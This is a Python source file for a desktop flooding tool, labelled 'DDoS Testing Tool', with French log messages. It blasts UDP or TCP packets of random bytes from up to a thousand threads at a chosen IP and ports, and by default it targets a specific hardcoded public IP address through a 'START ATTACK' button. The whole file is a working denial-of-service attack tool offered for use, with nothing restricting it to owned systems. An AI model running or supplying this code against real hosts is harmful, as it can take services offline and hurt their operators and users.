import socket
import threading
import random
import time
import customtkinter as ctk
from tkinter import messagebox

attack_thread = None
is_running = False
PACKETS_PER_THREAD = 100

def launch_ddos_tool(root, callback_home=None):
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    
    ddos_frame = ctk.CTkFrame(root)
    ddos_frame.pack(fill="both", expand=True, padx=10, pady=5)
    
    title = ctk.CTkLabel(
        ddos_frame, 
        text="DDoS Testing Tool",
        font=("Roboto", 20, "bold")
    )
    title.pack(pady=5)

    main_frame = ctk.CTkFrame(ddos_frame)
    main_frame.pack(fill="both", expand=True, padx=10, pady=5)

    entries = {}
    default_values = {
        "IP": "15.235.163.133",
        "Port(s)": "80",
        "Threads": "1000",
        "Packet Size": "65507",
        "Duration(s)": "60",
        "Packets per Thread": str(PACKETS_PER_THREAD)
    }

    for label_text, default_value in default_values.items():
        frame = ctk.CTkFrame(main_frame)
        frame.pack(fill="x", padx=5, pady=2)
        
        ctk.CTkLabel(
            frame,
            text=label_text,
            font=("Roboto", 12, "bold"),
            width=120
        ).pack(side="left", padx=5)
        
        entry = ctk.CTkEntry(
            frame,
            placeholder_text=default_value,
            width=120,
            height=25
        )
        entry.insert(0, default_value)
        entry.pack(side="left", padx=5)
        entries[label_text] = entry

    random_ports_var = ctk.BooleanVar(value=False)
    random_ports_checkbox = ctk.CTkCheckBox(
        main_frame,
        text="Utiliser des ports aléatoires",
        variable=random_ports_var
    )
    random_ports_checkbox.pack(padx=5, pady=5)

    protocol_frame = ctk.CTkFrame(main_frame)
    protocol_frame.pack(fill="x", padx=5, pady=2)

    ctk.CTkLabel(protocol_frame, text="Protocol", font=("Roboto", 12, "bold")).pack(side="left", padx=5)

    protocol_var = ctk.StringVar(value="UDP")
    ctk.CTkRadioButton(protocol_frame, text="UDP", variable=protocol_var, value="UDP").pack(side="left")
    ctk.CTkRadioButton(protocol_frame, text="TCP", variable=protocol_var, value="TCP").pack(side="left")

    button_frame = ctk.CTkFrame(main_frame)
    button_frame.pack(fill="x", padx=5, pady=5)

    start_button = ctk.CTkButton(
        button_frame,
        text="START ATTACK",
        command=lambda: start_attack(
            entries["IP"].get(),
            entries["Port(s)"].get(),
            entries["Threads"].get(),
            entries["Packet Size"].get(),
            entries["Duration(s)"].get(),
            entries["Packets per Thread"].get(),
            log_text,
            protocol_var.get(),
            random_ports_var.get()
        ),
        font=("Roboto", 14, "bold"),
        height=35,
        width=140,
        fg_color="#00aa00",
        hover_color="#008800"
    )
    start_button.pack(side="left", padx=5)

    stop_button = ctk.CTkButton(
        button_frame,
        text="STOP",
        command=stop_attack,
        font=("Roboto", 14, "bold"),
        height=35,
        width=140,
        fg_color="#ff0000",
        hover_color="#cc0000"
    )
    stop_button.pack(side="left", padx=5)

    home_button = ctk.CTkButton(
        button_frame,
        text="HOME",
        command=lambda: go_to_home(ddos_frame, callback_home),
        font=("Roboto", 14),
        height=35,
        width=100
    )
    home_button.pack(side="right", padx=5)


    log_text = ctk.CTkTextbox(
        main_frame,
        height=150,
        font=("Roboto", 12)
    )
    log_text.pack(fill="both", expand=True, padx=5, pady=5)
    log_text.insert("1.0", "Logs d'attaque:\n")

def start_attack(target_ip, target_ports, thread_count, packet_size, duration, packets_per_thread, log_text, protocol, random_ports):
    global attack_thread, is_running
    if is_running:
        messagebox.showwarning("Erreur", "L'attaque est déjà en cours.")
        return

    try:
        thread_count = int(thread_count)
        packet_size = int(packet_size)
        duration = int(duration)
        packets_per_thread = int(packets_per_thread)
        ports = [int(port.strip()) for port in target_ports.split(',')] if not random_ports else None
    except ValueError:
        messagebox.showerror("Erreur", "Veuillez entrer des valeurs valides.")
        return

    is_running = True
    attack_thread = threading.Thread(target=attack, args=(target_ip, ports, thread_count, packet_size, duration, packets_per_thread, log_text, protocol, random_ports))
    attack_thread.start()

def stop_attack():
    global is_running
    is_running = False
    messagebox.showinfo("Arrêt", "Attaque DDoS arrêtée.")

def attack(target_ip, ports, thread_count, packet_size, duration, packets_per_thread, log_text, protocol, random_ports):
    end_time = time.time() + duration
    sent_bytes = 0

    if random_ports:
 
        ports = [random.randint(1, 65535) for _ in range(thread_count)]

    while time.time() < end_time and is_running:
        for port in ports if ports else [random.randint(1, 65535)]:
            for _ in range(packets_per_thread):
                try:
                    if protocol == "TCP":
                     
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((target_ip, port))
                        packet = random._urandom(packet_size)
                        sock.send(packet)
                        sock.close()
                    else:
                     
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        packet = random._urandom(packet_size)
                        sock.sendto(packet, (target_ip, port))
                        sock.close()

                    sent_bytes += packet_size
                    log_text.insert("end", f"Envoyé {sent_bytes} octets vers {target_ip}:{port} via {protocol}\n")
                    log_text.see("end")
                except Exception as e:
                    log_text.insert("end", f"Erreur lors de l'envoi à {target_ip}:{port} - {str(e)}\n")
                    log_text.see("end")

    print(f"Attaque terminée : {sent_bytes} octets envoyés.")

def go_to_home(ddos_frame, callback_home):
    ddos_frame.destroy()
    if callback_home:
        callback_home()

if __name__ == "__main__":
    root = ctk.CTk()
    root.title("DDoS Testing Tool")
    root.geometry("500x400") 
    launch_ddos_tool(root)
    root.mainloop()
